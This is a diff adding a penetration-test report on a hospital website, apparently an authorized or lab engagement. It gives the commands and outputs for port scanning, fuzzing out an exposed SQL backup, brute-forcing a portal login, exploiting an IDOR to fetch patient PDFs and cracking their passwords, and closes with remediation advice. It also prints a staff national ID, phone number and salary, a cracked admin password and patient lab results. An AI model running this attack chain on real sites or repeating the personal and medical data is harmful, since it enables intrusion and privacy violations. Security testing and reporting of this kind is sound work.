@@ -1,0 +1,449 @@
+================================================================================
+         MEDIROZA GENERAL HOSPITAL - Pentest report
+================================================================================
+
+Tester:              Mithun Kumar Rajak
+Target:              https://medirozahospital.com
+Assessment Date:     2026-09-05 to 2026-09-07
+Classification:      CONFIDENTIAL - FOR AUTHORIZED USE ONLY
+
+================================================================================
+                    PHASE 1: RECONNAISSANCE
+================================================================================
+
+STEP 1: Nmap Port Scan
+----------------------
+Goal: Identify open ports and services on the target.
+
+Command:
+nmap -p 2082,2083,2086,2087,2095,2096 medirozahospital.com
+
+Tool Used: Nmap
+
+Result:
+PORT     STATE    SERVICE
+2082/tcp open     infowave
+2083/tcp open     radsec
+2086/tcp filtered gnunet
+2087/tcp filtered eli
+2095/tcp open     nbx-ser
+2096/tcp open     nbx-dir
+
+Findings:
+- cPanel accessible on ports 2082 & 2083
+- WHM filtered (firewall in place)
+- Webmail accessible on ports 2095 & 2096
+
+
+STEP 2: Directory Fuzzing
+-------------------------
+Goal: Discover hidden directories and files.
+
+Command:
+ffuf -u https://medirozahospital.com/FUZZ \
+     -w /usr/share/wordlists/dirb/common.txt \
+     -t 5 -p 1.0 -fc 404,403,429 -c
+
+Tool Used: FFUF
+
+Result:
+/old/                   [Status: 301]
+/staff/                 [Status: 301]
+/patient/               [Status: 301]
+/robots.txt             [Status: 200]
+/wp-admin               [Status: 200]
+
+Findings:
+- /old/ directory likely contains backup files
+- /patient/ is the patient portal
+- /staff/ is the staff portal
+- WordPress admin exists at /wp-admin
+
+
+STEP 3: Robots.txt Analysis
+---------------------------
+Goal: Identify restricted/disallowed paths.
+
+Command:
+curl -sk https://medirozahospital.com/robots.txt
+
+Tool Used: curl
+
+Result:
+User-agent: *
+Disallow: /patient/
+Disallow: /staff/
+Disallow: /old/
+
+Sitemap: https://medirozahospital.com/sitemap.xml
+
+Findings:
+- /old/ directory confirmed as backup location
+- /patient/ and /staff/ portals identified
+- Sitemap may reveal additional endpoints
+
+
+================================================================================
+                    PHASE 2: DATA BREACH DISCOVERY
+================================================================================
+
+STEP 4: /old/ Directory Enumeration
+-----------------------------------
+Goal: Discover files in the backup directory.
+
+Command:
+ffuf -u https://medirozahospital.com/old/FUZZ \
+     -w /usr/share/wordlists/dirb/common.txt \
+     -e .sql,.bak,.backup,.gz,.zip -t 5 -p 1.0 -fc 404,403,429 -c
+
+Tool Used: FFUF
+
+Result:
+mediroza_db_backup_2019.sql    [Status: 200]
+
+Findings:
+- SQL database backup exposed publicly
+- 2019 backup contains sensitive data
+
+
+STEP 5: Download and Analyze SQL Backup
+---------------------------------------
+Goal: Extract sensitive data from the backup.
+
+Command:
+curl -sk https://medirozahospital.com/old/mediroza_db_backup_2019.sql -o backup.sql
+cat backup.sql | grep -E "INSERT INTO"
+
+Tool Used: curl, cat
+
+Findings:
+┌─────────────────────────────────────────────────────────────────┐
+│ DATA EXTRACTED:                                                │
+│ - 30 Staff Records (Names, National IDs, Emails, Salaries)     │
+│ - 10 Shareholder Records (Names, Share Percentages)            │
+└─────────────────────────────────────────────────────────────────┘
+
+EVIDENCE:
+INSERT INTO staff VALUES (1,'Dr. Rajesh Naidoo','Chief Pathologist',
+  'Diagnostics Lab','r.naidoo@medirozahospital.com',
+  '+27 82 101 2007','85021013011081',138000,'2009-03-16');
+
+INSERT INTO shareholders VALUES (1,'Dr. Rajesh Naidoo',18.0,180000,'Ordinary');
+
+
+================================================================================
+                    PHASE 3: AUTHENTICATION TESTING
+================================================================================
+
+STEP 6: Identify Patient Login Endpoint
+---------------------------------------
+Goal: Locate the patient login page.
+
+Command:
+curl -sk https://medirozahospital.com/patient/login.php | head -50
+
+Tool Used: curl
+
+Result:
+Patient Portal login form discovered:
+- Username field (name="username")
+- Password field (name="password")
+- No CSRF token present
+
+
+STEP 7: Credential Discovery with Burp Suite Intruder
+-----------------------------------------------------
+Goal: Find valid login credentials.
+
+Tool Used: Burp Suite Intruder
+
+Method:
+1. Intercept login request: POST /patient/login.php
+2. Send to Intruder
+3. Set payload positions on username and password
+4. Use wordlist (fast_tract.txt)
+5. Identify successful login response
+
+Result:
+┌─────────────────────────────────────────────────────────────────┐
+│ CREDENTIALS FOUND:                                             │
+│ Username: admin                                                │
+│ Password: P@55w0rd!                                            │
+└─────────────────────────────────────────────────────────────────┘
+
+
+STEP 8: Login with Found Credentials
+------------------------------------
+Goal: Confirm access to patient portal.
+
+Command:
+curl -sk -X POST "https://medirozahospital.com/patient/login.php" \
+     -d "username=admin&password=P@55w0rd!" \
+     -I | grep -i "set-cookie"
+
+Tool Used: curl
+
+Result:
+HTTP/2 302 Found
+Location: portal.php
+Set-Cookie: PHPSESSID=NEW_SESSION_ID; path=/; secure
+
+
+================================================================================
+                    PHASE 4: IDOR EXPLOITATION
+================================================================================
+
+STEP 9: Access Patient Portal
+-----------------------------
+Goal: View available patient reports.
+
+Command:
+curl -sk "https://medirozahospital.com/patient/portal.php" \
+     -H "Cookie: PHPSESSID=NEW_SESSION_ID"
+
+Tool Used: curl
+
+Result:
+┌─────────────────────────────────────────────────────────────────┐
+│ REPORTS FOUND:                                                 │
+│ 1. Pathology Report - S. Dlamini   (LR-2024-1187)  Encrypted  │
+│ 2. Pathology Report - P. Reddy     (LR-2024-1192)  Encrypted  │
+│ 3. Pathology Report - E. Thompson  (LR-2024-1205)  Encrypted  │
+└─────────────────────────────────────────────────────────────────┘
+
+
+STEP 10: IDOR - Download PDFs
+-----------------------------
+Goal: Download patient reports without ownership validation.
+
+Command:
+curl -sk "https://medirozahospital.com/patient/download.php?id=1" \
+     -H "Cookie: PHPSESSID=NEW_SESSION_ID" \
+     -o patient_report_1.pdf
+
+curl -sk "https://medirozahospital.com/patient/download.php?id=2" \
+     -H "Cookie: PHPSESSID=NEW_SESSION_ID" \
+     -o patient_report_2.pdf
+
+curl -sk "https://medirozahospital.com/patient/download.php?id=3" \
+     -H "Cookie: PHPSESSID=NEW_SESSION_ID" \
+     -o patient_report_3.pdf
+
+Tool Used: curl
+
+Result:
+All 3 PDFs downloaded successfully
+
+Observation:
+Any authenticated user can access any patient's report
+No ownership validation between patient account and requested file
+
+
+================================================================================
+                    PHASE 5: PDF ENCRYPTION CRACKING
+================================================================================
+
+STEP 11: Extract PDF Hashes
+---------------------------
+Goal: Extract crackable hashes from encrypted PDFs.
+
+Command:
+pdf2john patient_report_1.pdf > patient1.hash
+pdf2john patient_report_2.pdf > patient2.hash
+pdf2john patient_report_3.pdf > patient3.hash
+
+Tool Used: pdf2john
+
+Result:
+patient_report_1.pdf:$pdf$2*3*128*4294967292*1*32*...
+patient_report_2.pdf:$pdf$2*3*128*4294967292*1*32*...
+patient_report_3.pdf:$pdf$2*3*128*4294967292*1*32*...
+
+Hash Format:
+- Version: 2 (PDF 1.4-1.6)
+- Revision: 3 (128-bit AES)
+- Key Length: 128 bit
+
+
+STEP 12: Crack PDF 1 - S. Dlamini
+---------------------------------
+Goal: Crack password for patient_report_1.pdf.
+
+Command:
+john --wordlist=/usr/share/wordlists/rockyou.txt patient1.hash
+
+Tool Used: John the Ripper
+
+Result:
+Found password: 123456
+
+Time to Crack: Instant
+
+
+STEP 13: Crack PDF 2 - P. Reddy
+-------------------------------
+Goal: Crack password for patient_report_2.pdf.
+
+Command:
+john --wordlist=/usr/share/wordlists/rockyou.txt patient2.hash
+
+Tool Used: John the Ripper
+
+Result:
+Found password: password
+
+Time to Crack: Instant
+
+
+STEP 14: Crack PDF 3 - E. Thompson
+----------------------------------
+Goal: Crack password for patient_report_3.pdf.
+
+Command:
+pdfcrack -f patient_report_3.pdf -w /usr/share/wordlists/rockyou.txt
+
+Tool Used: pdfcrack
+
+Result:
+Found user-password: '!@#$%^&'
+
+Time to Crack: Very Fast
+
+
+STEP 15: Decrypt PDFs
+---------------------
+Goal: Decrypt all 3 PDFs using the cracked passwords.
+
+Command:
+qpdf --password="123456" --decrypt patient_report_1.pdf patient_report_1_decrypted.pdf
+qpdf --password="password" --decrypt patient_report_2.pdf patient_report_2_decrypted.pdf
+qpdf --password='!@#$%^&' --decrypt patient_report_3.pdf patient_report_3_decrypted.pdf
+
+Tool Used: qpdf
+
+Result:
+All 3 PDFs decrypted successfully
+
+
+STEP 16: Extract Text Content
+-----------------------------
+Goal: Read the contents of decrypted reports.
+
+Command:
+pdftotext patient_report_1_decrypted.pdf report1.txt
+pdftotext patient_report_2_decrypted.pdf report2.txt
+pdftotext patient_report_3_decrypted.pdf report3.txt
+
+Tool Used: pdftotext
+
+Result:
+┌─────────────────────────────────────────────────────────────────┐
+│ REPORT 1: S. Dlamini (MG-P-10231)                              │
+│ Date: 2024-11-04                                               │
+│ Findings: High White Cell Count (11.8)                         │
+│ Reported by: Dr. Rajesh Naidoo                                 │
+├─────────────────────────────────────────────────────────────────┤
+│ REPORT 2: P. Reddy (MG-P-10244)                                │
+│ Date: 2024-11-05                                               │
+│ Findings: High Cholesterol (6.4), High LDL (4.1)              │
+│ Reported by: Dr. Susan Botha                                   │
+├─────────────────────────────────────────────────────────────────┤
+│ REPORT 3: E. Thompson (MG-P-10258)                             │
+│ Date: 2024-11-06                                               │
+│ Findings: Low Haemoglobin (11.4), Low Ferritin (9), Low Vit D │
+│ Reported by: Dr. Rajesh Naidoo                                 │
+└─────────────────────────────────────────────────────────────────┘
+
+
+================================================================================
+                    PHASE 6: SUMMARY OF FINDINGS
+================================================================================
+
+Step-by-Step Attack Chain:
+--------------------------
+
+Step 1: Nmap Scan
+        → Identified open ports (2082, 2083, 2095, 2096)
+
+Step 2: FFUF Directory Fuzzing
+        → Discovered /old/, /patient/, /staff/
+
+Step 3: FFUF Backup Enumeration
+        → Found mediroza_db_backup_2019.sql
+
+Step 4: SQL Backup Analysis
+        → Extracted 30 salaries & 10 shareholders
+
+Step 5: Burp Suite Credential Discovery
+        → Found admin:P@55w0rd!
+
+Step 6: Patient Portal Login
+        → Accessed portal with admin credentials
+
+Step 7: IDOR Exploitation
+        → Downloaded 3 patient PDFs via download.php?id=1,2,3
+
+Step 8: pdf2john Hash Extraction
+        → Extracted hashes from all 3 PDFs
+
+Step 9: John the Ripper / pdfcrack
+        → Cracked all 3 passwords (123456, password, !@#$%^&)
+
+Step 10: qpdf Decryption
+        → Decrypted all 3 PDFs
+
+Step 11: pdftotext Extraction
+        → Read all 3 patient medical reports
+
+
+Vulnerabilities Found:
+----------------------
+
+┌─────────────────────────────────────────────────────────────────┐
+│ #  │ Vulnerability              │ Severity  │ Tool Used        │
+├────┼────────────────────────────┼───────────┼──────────────────┤
+│ 1  │ Data Breach (SQL Backup)   │ CRITICAL  │ FFUF, curl       │
+│ 2  │ IDOR - PDF Download        │ CRITICAL  │ Burp Suite, curl │
+│ 3  │ Weak Default Credentials   │ CRITICAL  │ Burp Intruder    │
+│ 4  │ Weak PDF Encryption        │ CRITICAL  │ John, pdfcrack   │
+│ 5  │ Username Enumeration       │ MEDIUM    │ Burp Suite       │
+│ 6  │ No CSRF Protection         │ MEDIUM    │ Burp Suite       │
+│ 7  │ No Rate Limiting           │ MEDIUM    │ Burp Suite       │
+│ 8  │ Directory Listing          │ MEDIUM    │ FFUF             │
+│ 9  │ CMS Version Disclosure     │ LOW       │ curl             │
+└─────────────────────────────────────────────────────────────────┘
+
+
+================================================================================
+                    PHASE 7: TOOLS SUMMARY
+================================================================================
+
+| Tool Name          | Usage                                              |
+|--------------------|----------------------------------------------------|
+| Nmap               | Port scanning and service detection                |
+| FFUF               | Directory and file fuzzing                         |
+| Burp Suite         | Request interception and credential discovery      |
+| John the Ripper    | PDF password hash cracking                         |
+| pdfcrack           | PDF password cracking                              |
+| pdf2john           | PDF hash extraction                                |
+| qpdf               | PDF decryption                                     |
+| pdftotext          | Extract text from PDFs                             |
+| curl               | Manual HTTP requests                               |
+
+
+================================================================================
+                    PHASE 8: RECOMMENDATIONS
+================================================================================
+
+Immediate Actions:
+-------------------
+1. Remove: /old/mediroza_db_backup_2019.sql
+2. Force password reset for all patient accounts
+3. Restrict /old/ directory access using .htaccess
+
+Urgent Actions:
+---------------
+4. Fix IDOR: Add ownership validation to /patient/download.php
+5. Implement rate limiting on login endpoints
+6. Add CSRF tokens to all forms
+7. Update CMS to latest secure version
